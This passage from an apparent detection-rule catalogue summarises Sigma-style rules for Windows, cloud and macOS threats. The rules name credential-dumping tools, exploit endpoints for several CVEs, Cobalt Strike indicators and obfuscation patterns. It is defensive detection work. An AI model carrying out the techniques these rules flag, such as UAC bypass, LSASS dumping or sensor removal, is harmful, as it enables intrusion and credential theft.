  Summary: This rule detects the execution of "wusa.exe," the Windows Update Standalone
    Installer, when its parent process is located in a suspicious directory. Malicious
    actors may leverage "wusa.exe" to bypass User Account Control (UAC), thereby duplicating
    its access token to gain elevated system privileges. The rule identifies these
    instances by monitoring for parent processes located in directories such as '\Perflogs\',
    '\Users\Public\', '\Windows\Temp\', and specific subdirectories within '\Users\'.
  Updated-Date: '2024_09_04'
ef9dcfed-690c-4c5d-a9d1-482cd422225c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0bb8e15f196267f10d45af2c91516055
  Ruleset: sigmahq
  Summary: This rule detects the execution of Chromium-based browsers in headless
    mode on Windows systems. The rule identifies instances where browser executables
    such as Brave, Chrome, Edge, Opera, and Vivaldi are run with the '--headless'
    command line argument. Executing browsers in headless mode can be used in various
    attack techniques, including command-and-control operations. Headless mode operation
    is typically associated with automation tasks and can be indicative of malicious
    activity if observed outside of expected contexts.
  Updated-Date: '2024_09_04'
efafe0bf-4238-479e-af8f-797bd3490d2d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 064c0e22f9ca5c8bcfeaa88bed79575d
  Ruleset: core
  Summary: This rule detects when "cmstp.exe" initiates an outbound network connection.
    Since it is uncommon for "cmstp.exe" to perform such actions, any instance of
    this behavior should be investigated to determine whether it is malicious. The
    detection mechanism filters out local and private IP ranges to focus on potentially
    suspicious external connections.
  Updated-Date: '2024_09_03'
efdb2003-a922-48aa-8f37-8b80021a9706:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4d52085a306fda9d62762bd41bf032de
  Ruleset: emerging-threats
  Summary: This rule detects possible exploitation of the VMware Workspace ONE Access
    Admin Remote Code Execution vulnerability, known as CVE-2022-31659. It monitors
    web server logs for POST requests containing the URI query "/SAAS/jersey/manager/api/migrate/tenant,"
    which may indicate an attempt to exploit this vulnerability. False positives may
    occur from vulnerability scanners or legitimate access to the URI.
  Updated-Date: '2024_09_03'
efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c2d386ef91713ce7f1d31388b3dca214
  Ruleset: core
  Summary: This rule detects suspicious program names or folder paths that resemble
    those commonly found in malicious software or hacking tools. It identifies suspicious
    patterns in the names of executables, such as those ending in "\artifact.exe"
    or containing "obfuscated.exe." It also scrutinizes command-line inputs for certain
    scripts, including "inject.ps1," "pupy.ps1," and "mimikatz.ps1," as these are
    frequently associated with malicious activities. By monitoring such patterns,
    the rule aims to spot potential threats that use obfuscated or misleading names
    to evade detection.
  Updated-Date: '2024_09_03'
efec536f-72e8-4656-8960-5e85d091345b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dbf799e5e93f25ccca2e7aa9263b2aa0
  Ruleset: core
  Summary: This rule detects the usage of attrib.exe with the "+s" option to mark
    scripts or executables as system files, which hides them from users and prevents
    deletion with simple user rights. The detection is scoped to specific file extensions
    and directories to minimize false positives and focuses on suspicious locations
    such as \Users\Public\, \AppData\Local\, \ProgramData\, \Downloads\, and \Windows\Temp\.
  Updated-Date: '2024_09_03'
effee1f6-a932-4297-a81f-acb44064fa3a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8c94bc484453d0fde549249ae49170fe
  Ruleset: emerging-threats
  Summary: This rule detects attempts to exploit a specific vulnerability identified
    as CVE-2021-26858, which involves a Server-Side Request Forgery (SSRF) attack
    to manipulate virtual directories in Microsoft Exchange servers. The attack is
    recognized by monitoring IIS logs for POST requests to a particular Exchange Control
    Panel (ECP) endpoint (`/ecp/DDI/DDIService.svc/SetObject`) that include query
    parameters indicative of a directory reset action. Successful exploitation is
    determined by a combination of HTTP status code 200 and specific query keywords,
    along with the presence of system account names that end with a dollar sign (`$`).
  Updated-Date: '2024_09_03'
f033f3f3-fd24-4995-97d8-a3bb17550a88:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 968f5f9d4b9475692da65f59fede28e9
  Ruleset: sigmahq
  Summary: This rule detects suspicious Windows Management Instrumentation (WMI) event
    filters and command line event consumers by analyzing Windows Security Logs. Specifically,
    it focuses on Event ID 4662, which indicates operations on WMI namespaces, and
    the presence of 'subscription' in the object name, a common indicator of malicious
    persistence mechanisms. This detection helps identify unauthorized use of WMI
    for maintaining persistent access or escalating privileges on a system.
  Updated-Date: '2024_09_04'
f0500377-bc70-425d-ac8c-e956cd906871:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 64d666a214d0f259af5428fba381b7a4
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts targeting vulnerabilities in Arcadyan
    routers, specifically those reported under CVE-2021-20090 and CVE-2021-20091.
    It identifies malicious activities such as path traversal queries and configuration
    file injection attempts by examining specific patterns in URI queries. The rule
    aims to detect unauthorized access and abnormal configuration changes in Arcadyan
    routers arising from these vulnerabilities.
  Updated-Date: '2024_09_03'
f0507c0f-a3a2-40f5-acc6-7f543c334993:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 54ed6e96ae1e7eb4abfa1fdb29fb8fe4
  Ruleset: core
  Summary: This rule detects the execution of the "net use" command to mount a WebDAV
    server, followed by the immediate execution of content hosted on it, such as .exe,
    .dll, .bat, .vbs, or .ps1 files. This behavior might indicate the use of malicious
    LNK files, which are often employed in cyber attacks to execute remote code on
    a target system. The detection process monitors instances where the command prompt
    (cmd.exe) is used to establish a WebDAV connection and quickly run scripts or
    executables from the resulting share.
  Updated-Date: '2024_09_03'
f0540f7e-2db3-4432-b9e0-3965486744bc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4f1ea539b08f29ff8a2aa65a44d937aa
  Ruleset: core
  Summary: This rule detects unexpected executable file writes on a Windows system
    by monitoring specific programs that typically should not perform such actions.
    It targets a list of executable files, including Microsoft Office programs (e.g.,
    eqnedt32.exe, wordpad.exe, wordview.exe), various legitimate binaries that can
    download executables (e.g., certutil.exe, CertReq.exe, mshta.exe), and other executables
    that should not drop files to disk like AcroRd32.exe and RdrCEF.exe. By focusing
    on these programs, the rule aims to identify potential misuse or malicious activities
    such as process injection or malware disguising as legitimate software when they
    write executable files with extensions like .exe, .dll, or .ocx to the disk.
  Updated-Date: '2024_09_03'
f0767f15-0fb3-44b9-851e-e8d9a6d0005d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 142c48803e6a9b72b25765fb3af8a88f
  Ruleset: sigmahq
  Summary: This rule detects the execution of Scheduled Tasks on Windows systems where
    the program being run is located in a suspicious location or involves an unusual
    program. It identifies the creation of task processes involving specific executables
    such as `calc.exe`, `cscript.exe`, `mshta.exe`, `mspaint.exe`, `notepad.exe`,
    `regsvr32.exe`, and `wscript.exe`. This type of execution can indicate persistence
    techniques potentially employed by malicious actors, utilizing less common legitimate
    binaries (LOLBINs) to evade detection.
  Updated-Date: '2024_09_04'
f0b70adb-0075-43b0-9745-e82a1c608fcc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fb2ad5e76da0194fcc5ed528798bc125
  Ruleset: emerging-threats
  Summary: This rule detects the initiation of the ZxShell malware by identifying
    specific functions associated with it. ZxShell is a remote access trojan (RAT)
    that can execute commands remotely and perform various malicious activities. The
    detection focuses on process creation events where the executable file 'rundll32.exe'
    contains command line arguments such as 'zxFunction' or 'RemoteDiskXXXXX'.
  Updated-Date: '2024_09_03'
f0bafe60-1240-4798-9e60-4364b97e6bad:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9e0e13e46b08614c7e6cdbd7a89a8e29
  Ruleset: emerging-threats
  Summary: This rule detects malicious indicators associated with the Goofy Guineapig
    backdoor malware. Specifically, it monitors for the presence of certain files
    commonly used by this malware within the directory 'C:\ProgramData\GoogleUpdate\',
    including 'config.dat', 'GoogleUpdate.exe', 'tmp.bat', and 'goopdate.dll'. These
    files are indicative of attempts to execute the malware and evade defense mechanisms
    on Windows systems.
  Updated-Date: '2024_09_03'
f0ca6c24-3225-47d5-b1f5-352bf07ecfa7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 84e5595b6165851da24d7a6af81ef153
  Ruleset: core
  Summary: This rule detects the execution of DefenderCheck, a tool designed to analyze
    the signature patterns used by Microsoft Defender. By revealing the specific strings
    or byte sequences that trigger detection in Microsoft Defender, DefenderCheck
    can be utilized for antivirus evasion techniques.
  Updated-Date: '2024_09_03'
f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e98a7f7b557a57c988f6b856d854d0e0
  Ruleset: sigmahq
  Summary: This rule detects potential command-line obfuscation using known escape
    characters within the Windows operating system. By identifying specific patterns
    such as 'h^t^t^p' and 'h"t"t"p', the rule aims to flag instances where attackers
    may be attempting to hide their true command intentions, often seen in defense
    evasion tactics (attack.t1140). This technique is notably used in targeted attacks
    to evade detection by traditional security measures.
  Updated-Date: '2024_09_04'
f0d1feba-4344-4ca9-8121-a6c97bd6df52:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 707d39b0c3b41b7fb130f2c2f020c04f
  Ruleset: core
  Summary: This rule detects the execution of well-known credential dumping tools
    via service execution events in a Windows environment. It identifies specific
    tools such as Cachedump, Dumpsvc, Fgexec, Gsecdump, Mimidrv, Pwdump, and Servpw
    by monitoring for Event ID 4697, which logs service installations. This detection
    helps in identifying unauthorized attempts to access or recover passwords by intercepting
    the execution of these tools typically used for credential dumping.
  Updated-Date: '2024_09_03'
f0e2b768-5220-47dd-b891-d57b96fc0ec1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a8aad1ddfeb7c51b84901f975dfd25ea
  Ruleset: sigmahq
  Summary: This rule detects the creation of the default CSExec service filename,
    specifically `csexecsvc.exe`, on Windows systems. This event is indicative of
    the installation and execution of the CSExec service.
  Updated-Date: '2024_09_04'
f0f7be61-9cf5-43be-9836-99d6ef448a18:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 579d2bd8dfefa3fbf84e1eb46c68e603
  Ruleset: core
  Summary: This rule detects attempts to uninstall the Crowdstrike Falcon Sensor on
    Windows systems. Adversaries may engage in this activity to disable security measures
    and avoid detection. It identifies process creation events with command lines
    containing specific parameters related to the uninstallation of the Crowdstrike
    Falcon Sensor, including '\WindowsSensor.exe', ' /uninstall', and ' /quiet'.
  Updated-Date: '2024_09_03'
f1086bf7-a0c4-4a37-9102-01e573caf4a0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4b9cbed9397800865bd23421e1c6ce01
  Ruleset: core
  Summary: This rule detects the execution of the 'whoami' command that has been renamed
    to another name in order to evade detection. 'Whoami' is typically used to display
    the current user name and related information, and renaming it can indicate malicious
    activity or attempts at obfuscation. This behavior is particularly suspicious
    as it deviates from standard procedures, potentially signaling the presence of
    malware or unauthorized user activity, with potential links to threats such as
    Agent Tesla keylogger.
  Updated-Date: '2024_09_03'
f10ed525-97fe-4fed-be7c-2feecca941b1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 26df3b9349aaaef7d4a11feb4f6385c5
  Ruleset: core
  Summary: This rule detects when an attacker modifies the registry value of "hhctrl"
    to point to a custom binary.
  Updated-Date: '2024_09_03'
f11f2808-adb4-46c0-802a-8660db50fa99:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b5c0dae99e9c02bf3c6e740bc4013bcc
  Ruleset: core
  Summary: This rule detects unusual parent or child processes associated with the
    ImagingDevices.exe process, which is related to Windows Contacts. Such anomalies
    have been observed in conjunction with Bumblebee malware activity. The detection
    focuses on identifying unexpected parent processes like WmiPrvSE.exe, svchost.exe,
    and dllhost.exe, or any suspicious child processes spawned by ImagingDevices.exe.
    The rule aims to uncover defense evasion and execution behavior linked to malware
    exploits.
  Updated-Date: '2024_09_03'
f130a5f1-73ba-42f0-bf1e-b66a8361cb8f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d2decf08cc2f6010ca1bddba0af1aeef
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts of CVE-2024-3400, which
    is an OS command injection vulnerability in Palo Alto GlobalProtect. It identifies
    suspicious strings indicative of directory traversal attempts or command injection
    within the "mp-log" and "gpsvc.log" files of the Palo Alto GlobalProtect service.
    Specific patterns include failed unmarshalling sessions with path traversal signatures
    and suspicious keywords linked to telemetry exploits, such as '{IFS}', 'base64',
    'bash', 'curl', and 'http', as well as file paths like '/opt/panlogs/tmp/device_telemetry/'.
    This approach helps in identifying unauthorized commands attempting to exploit
    this vulnerability.
  Updated-Date: '2024_09_03'
f1408a58-0e94-4165-b80a-da9f96cf6fc3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bc4fd8033b203fc091802e33bada89c3
  Ruleset: core
  Summary: This rule detects possible malicious execution of JavaScript for Automation
    (JXA) in-memory via OSAScript on macOS systems. It triggers when the command line
    contains specific indicators such as 'osascript', ' -e ', 'eval', and 'NSData.dataWithContentsOfURL'.
    Additionally, it looks for command lines that include ' -l ' and 'JavaScript'
    or files with a '.js' extension. These patterns suggest the use of JXA scripts
    for potentially harmful activities, which can include executing JavaScript code
    directly in the memory, bypassing traditional file-based detection mechanisms.
  Updated-Date: '2024_09_03'
f14719ce-d3ab-4e25-9ce6-2899092260b0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6341f8e7fa282c42f394745d71fc8998
  Ruleset: core
  Summary: This rule detects the exploitation of a NTFS vulnerability that could lead
    to severe file system corruption on Windows systems. It identifies specific system
    events generated by the NTFS file system driver, notably Event ID 55 reporting
    a corrupted file record with the affected file named "\". This vulnerability was
    initially reported on platforms such as Twitter, and it gained attention due to
    its potential to corrupt hard drive data by simply viewing a malicious file icon.
  Updated-Date: '2024_09_03'
f14e169e-9978-4c69-acb3-1cff8200bc36:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7744278149061a129c940311c2df6746
  Ruleset: core
  Summary: This rule detects the suspicious execution of the utility `grpconv.exe`,
    which is used to convert Windows 3.x .grp files. The presence of `grpconv.exe
    -o` or `grpconv -o` in the command line is indicative of potential misuse by malicious
    actors or software for persistence purposes on Windows systems.
  Updated-Date: '2024_09_03'
f1531fa4-5b84-4342-8f68-9cf3fdbd83d4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 36259f500c66a0d5a28e9d55b2119319
  Ruleset: emerging-threats
  Summary: This rule detects potential Dtrack Remote Access Trojan (RAT) activity
    by identifying specific process patterns indicative of the malware's operations.
    Dtrack is known for its use in cyber-espionage, often targeting high-value infrastructures
    such as nuclear power plants. The rule monitors command lines for patterns that
    include network diagnostic commands like 'ping' and 'ipconfig,' as well as 'netsh'
    commands, combined with specific output redirections. These specific command sequences
    are commonly used by Dtrack to gather and exfiltrate network information to temporary
    files.
  Updated-Date: '2024_09_03'
f177f2bc-5f3e-4453-b599-57eefce9a59c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d60d83b3427d98afeeabd35754cf8f09
  Ruleset: core
  Summary: This rule detects remote RPC calls that attempt to read information about
    scheduled tasks through AtScv. It specifically monitors events logged by the RPC
    Firewall, checking for a unique interface UUID associated with scheduled tasks
    via remote procedure calls (RPC). The detection aims to identify and block these
    events based on their operation numbers.
  Updated-Date: '2024_09_03'
f195b2ff-e542-41bf-8d91-864fb81e5c20:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8aa6b59b1d9b95d79def5d3a2d2723ca
  Ruleset: emerging-threats
  Summary: This rule detects exploitation activity associated with CVE-2023-46747,
    a vulnerability in F5 BIG-IP allowing unauthenticated remote code execution. It
    focuses on monitoring specific POST requests to the '/mgmt/tm/util/bash' URI that
    include certain hex-encoded or plaintext keywords indicative of an exploit attempt,
    such as '/tmui/Control/form' and 'form_page=%2ftmui%2fsystem%2fuser%2fcreate.jsp'.
    This rule aims to identify and alert on malicious activity that leverages this
    vulnerability for initial access and system compromise.
  Updated-Date: '2024_09_03'
f1b3a22a-45e6-4004-afb5-4291f9c21166:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 356066072cf8a32d77bd5d4d130f90ef
  Ruleset: core
  Summary: This rule detects the execution of PsExec or PAExec with renamed service
    names, which helps differentiate between legitimate use of PsExec and potential
    misuse by attackers employing a modified PsExec client different from the Sysinternals
    version. The rule focuses on identifying suspicious service names and paths associated
    with PsExec operations and filters out standard service names to reduce noise.
    This detection mechanism aids in pinpointing unauthorized lateral movement attempts
    within a network.
  Updated-Date: '2024_09_03'
f1edd233-30b5-4823-9e6a-c4171b24d316:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fd60ccb01120c06fbd56790263cdc408
  Ruleset: core
  Summary: This rule detects the use of Rundll32 to load malicious registered COM
    objects on Windows systems. It identifies this activity by monitoring process
    creation events for instances where Rundll32.exe is executed with specific command-line
    parameters indicative of malicious behavior, including `-sta` or `-localserver`
    and brackets `{}` which are commonly associated with COM objects.
  Updated-Date: '2024_09_03'
f1f3bf22-deb2-418d-8cce-e1a45e46a5bd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 343d550b7fa9e953d18c0495a1001b7c
  Ruleset: core
  Summary: This rule detects lateral movement by identifying the MMC20.Application
    COM object execution. It specifically looks for instances where the parent process
    `svchost.exe` spawns `mmc.exe` with the command line argument `-Embedding`. This
    behavior is indicative of potential misuse for lateral movement in a network environment,
    often associated with advanced persistent threats and sophisticated malware operations.
  Updated-Date: '2024_09_03'
f208d6d8-d83a-4c2c-960d-877c37da84e5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8011cf651e947ff2db0e19c6046edbc3
  Ruleset: sigmahq
  Summary: This rule detects the use of processes without a specific image name ending
    in ".exe." This tactic can be employed by attackers to evade detections that rely
    on identifying legitimate executable names.
  Updated-Date: '2024_09_04'
f239b326-2f41-4d6b-9dfa-c846a60ef505:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8f37fcd60ed8877e5f3987747b52ad06
  Ruleset: core
  Summary: This rule detects password dumper activity by monitoring remote thread
    creation events (EventID 8) specifically targeting the lsass.exe process. The
    rule identifies potentially malicious programs that initiate these threads. Since
    a single execution of such programs can generate hundreds of events, monitoring
    this activity is crucial for identifying credential access attempts.
  Updated-Date: '2024_09_03'
f241cf1b-3a6b-4e1a-b4f9-133c00dd95ca:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bfcb85d0d4ed990b4bbf3a10c8ec5d73
  Ruleset: sigmahq
  Summary: This rule detects the execution of obfuscated PowerShell scripts launched
    via the RUNDLL32 utility on Windows systems. It focuses on identifying instances
    where the DLL management application `rundll32.exe` interacts with `powershell`
    through specified DLLs and functions (`shell32.dll` and `shellexec_rundll`). The
    detection is triggered by Event ID 4697, highlighting potentially suspicious activity
    consistent with defense evasion and execution techniques often employed by attackers.
  Updated-Date: '2024_09_04'
f2485272-a156-4773-82d7-1d178bc4905b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bc762e4d1b40b23f20dfa9d03ba27b13
  Ruleset: sigmahq
  Summary: This rule detects the installation of NalDrv or PROCEXP152 services through
    registry keys pointing to non-system32 folders. These services are utilized by
    the tool Ghost-In-The-Logs, which itself leverages the Kernel Driver Utility (KDU).
    The rule identifies specific registry key modifications related to these services,
    excluding known legitimate executables that might be used in similar contexts.
  Updated-Date: '2024_09_04'
f24bcaea-0cd1-11eb-adc1-0242ac120002:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d6b76148478b68ad566b919224fa8695
  Ruleset: sigmahq
  Summary: This rule detects the initiation of non-default assistive technology applications
    using "Atbroker.EXE" in a Windows environment. It identifies processes where "AtBroker.exe"
    has been executed, specifically with command lines containing the term 'start'.
    The detection is refined by filtering out known built-in assistive technology
    features and the Oracle Java Access Bridge to focus on unusual or non-standard
    applications.
  Updated-Date: '2024_09_04'
f26307d8-14cd-47e3-a26b-4b4769f24af6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7576e50162ac91dcfd4c278923561432
  Ruleset: core
  Summary: This rule detects suspicious process patterns when CrackMapExec is used.
    CrackMapExec is a post-exploitation tool frequently leveraged by attackers to
    gather credentials and execute commands over SMB. The rule highlights specific
    command lines indicative of memory dumping, particularly targeting the Local Security
    Authority Subsystem Service (LSASS). It identifies command patterns involving
    Windows utilities such as `tasklist` and `cmd.exe`, and looks for specific arguments
    that suggest credential extraction activities. These command patterns are divided
    into sequences involving `tasklist` output filtering for `lsass.exe`, the execution
    of `rundll32.exe` with `MiniDump`, and the use of `procdump`. This detection mechanism
    aims to pinpoint credential dumping attempts associated with advanced persistent
    threats (APTs) and other sophisticated attackers.
  Updated-Date: '2024_09_03'
f26c6093-6f14-4b12-800f-0fcb46f5ffd0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7276af622923ea99c5a7f5c146ba33e5
  Ruleset: core
  Summary: This rule detects base64 encoded strings used in hidden, potentially malicious
    PowerShell command lines on Windows systems. Malicious actors often use base64
    encoding to obscure their activities, and this rule searches for specific encoded
    keywords within PowerShell command lines that indicate hidden operations. By scanning
    for these encoded strings, the rule aids in identifying and mitigating security
    threats originating from encoded PowerShell commands intended to evade detection.
  Updated-Date: '2024_09_03'
f26eb764-fd89-464b-85e2-dc4a8e6e77b8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b4b03cb351ad74988279c18ec5f2ffff
  Ruleset: sigmahq
  Summary: This rule detects suspicious child processes spawned by Electron applications
    such as Teams, Discord, Slack, and others, which may indicate tampering with ".asar"
    files or malicious binary execution through specific command-line arguments. It
    monitors for the creation of child processes like `cmd.exe`, `powershell.exe`,
    and other potentially harmful executables under parent processes associated with
    Electron-based apps. The rule also identifies suspicious file paths such as those
    in `\ProgramData\`, `\Temp\`, and `\Users\Public\`, which could be indicative
    of malicious activity. Specific exclusions are made to reduce false positives,
    such as legitimate usage by Discord of `cmd.exe` for NVIDIA SMI operations.
  Updated-Date: '2024_09_04'
f272fb46-25f2-422c-b667-45837994980f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 071f60e8965ec5d041f1be714e740efe
  Ruleset: sigmahq
  Summary: This rule detects successful authentications to important applications
    that only require single-factor authentication within an Azure environment. It
    identifies login events using the specified application IDs where single-factor
    authentication was utilized, which could potentially indicate a security risk.
  Updated-Date: '2024_09_04'
f2c64357-b1d2-41b7-849f-34d2682c0fad:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: eb88670a922a57e786261a6dc675d3f9
  Ruleset: sigmahq
  Summary: This rule detects the creation of scheduled tasks using "schtasks" in Windows
    environments that contain potentially suspicious or uncommon commands. It identifies
    specific command patterns, such as those set to execute as the system user every
    minute or involving commands like "cmd /c", "cmd /k", and "cmd.exe /c". The rule
    further detects uncommon command segments related to potentially malicious behavior,
    including encoded scripts, hidden windows execution, or script instructions like
    "bypass" and "IEX". Additionally, it looks for anomalous uses of temporary directories
    and public directories, as well as commands involving scripting tools like "cscript",
    "curl", and "wscript". These could indicate attempts to evade detection and execute
    potentially malicious activities within scheduled tasks.
  Updated-Date: '2024_09_04'
f318b911-ea88-43f4-9281-0de23ede628e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2cfbe1e2a7bba22325d639939d8141de
  Ruleset: sigmahq
  Summary: This rule detects the creation of the default CSExec named pipe, often
    associated with potential unwanted activity involving CSExec software. CSExec,
    similar to Cobalt Strike, facilitates lateral movement and remote code execution
    within systems. The detection focuses on identifying named pipes containing "\csexecsvc."
    While legitimate administrative actions may trigger this rule, its primary purpose
    is to flag potentially malicious activities leveraging default CSExec pipes.
  Updated-Date: '2024_09_04'
f331aa1f-8c53-4fc3-b083-cc159bc971cb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7eb672063a3641ccde0e457f0266ef28
  Ruleset: core
  Summary: This rule detects the creation of known offensive PowerShell scripts used
    for exploitation on Windows systems. The scripts include tools and functionalities
    associated with activities like persistence, exfiltration, reconnaissance, privilege
    escalation, and system manipulation. Notable examples are PowerSploit, PowerUpSQL,
    Invoke-PowerThIEf, and scripts for password spraying and UAC bypass. The rule
    monitors for specific PowerShell script names such as `Invoke-Mimikatz.ps1`, `Invoke-TotalExec.ps1`,
    `Get-GPPPassword.ps1`, and many others, focusing on identifying malicious behaviors
    typically leveraged by attackers.
  Updated-Date: '2024_09_03'
f346bbd5-2c4e-4789-a221-72de7685090d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cd1823b36d8ae82a097ebecaddaf3007
  Ruleset: sigmahq
  Summary: This rule detects when changes are made to a Google Cloud SQL database,
    specifically focusing on instances where the database has been created, deleted,
    or had its user information updated or deleted. The detection scope includes monitoring
    Google Cloud Platform audit logs for operations under the method names `cloudsql.instances.create`,
    `cloudsql.instances.delete`, `cloudsql.users.update`, and `cloudsql.users.delete`.
    This helps identify unauthorized or unexpected modifications to Cloud SQL instances.
    Potential false positives might occur due to administrative actions or known system
    behavior, which should be reviewed to ensure legitimate modifications are not
    incorrectly flagged.
  Updated-Date: '2024_09_04'
f34d942d-c8c4-4f1f-b196-22471aecf10a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ec39529890e96087f7fef12689c27c55
  Ruleset: emerging-threats
  Summary: This rule detects driver load events in the print service operational log
    that indicate successful exploitation attempts against the print spooler vulnerability
    known as CVE-2021-1675. The detection focuses on EventID 316 and specific keywords
    such as 'UNIDRV.DLL, kernelbase.dll,' and 'mimispool' to identify potential malicious
    activities exploiting this vulnerability.
  Updated-Date: '2024_09_03'
f354eba5-623b-450f-b073-0b5b2773b6aa:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e502b3e2fc37c6271cd6ef7b419c4447
  Ruleset: core
  Summary: This rule detects a potential DLL hijack involving "iertutil.dll" within
    the Internet Explorer environment. Specifically, it identifies instances where
    the "iexplore.exe" process loads the "iertutil.dll" file, indicative of a possible
    compromise through the Distributed Component Object Model (DCOM) InternetExplorer.Application
    Class. This method can be leveraged for lateral movement and other malicious activities.
  Updated-Date: '2024_09_03'
f356a9c4-effd-4608-bbf8-408afd5cd006:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2ffa0f83b67aadb513b24e56cc32a7eb
  Ruleset: core
  Summary: This rule detects a program that executed suspicious DNS queries typically
    associated with Cobalt Strike beacons. Cobalt Strike is a commercial penetration
    testing tool often used by attackers to leverage command and control (C2) communications.
    The rule identifies specific patterns in DNS queries, such as those starting with
    'aaa.stage.' or containing '.stage.123456.', which are indicative of potential
    malicious activity related to Cobalt Strike.
  Updated-Date: '2024_09_03'
f35c5d71-b489-4e22-a115-f003df287317:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 87b8433b13ba523384bdeb01af927695
  Ruleset: core
  Summary: This rule detects potential process patterns that indicate Cobalt Strike
    beacon activity on Windows systems. Cobalt Strike is a widely used post-exploitation
    toolkit designed for adversary simulations and red teaming exercises but often
    used maliciously. The rule identifies specific command line activities and parent
    image paths that are characteristic of Cobalt Strike. It monitors for instances
    where `cmd.exe` is executed with certain options, such as '/C whoami' or commands
    that create or write to pipes. Additionally, it looks for `conhost.exe` processes
    invoked with specific flags and conditions that suggest associative behavior typical
    of Cobalt Strike's operation methods.
  Updated-Date: '2024_09_03'
f376c8a7-a2d0-4ddc-aa0c-16c17236d962:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 08ba60f5866d23bf709e7c7154bf0b7e
  Ruleset: core
  Summary: This rule detects the execution of Bloodhound and SharpHound hack tools
    by identifying specific command line parameters commonly associated with their
    usage. Bloodhound and SharpHound are tools used for active directory enumeration
    and discovery, gathering information on users, groups, and computers in a network.
    The detection focuses on process creation events in Windows and looks for various
    indicators such as specific product names, descriptions, company names, and executable
    file names. Additionally, it identifies command line arguments related to collection
    methods, looping, port scanning, JSON folder paths, zip file names, and domain
    controller-only operations. By monitoring these attributes, the rule aims to identify
    potential malicious activity involving these reconnaissance tools.
  Updated-Date: '2024_09_03'
f37aba28-a9e6-4045-882c-d5004043b337:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
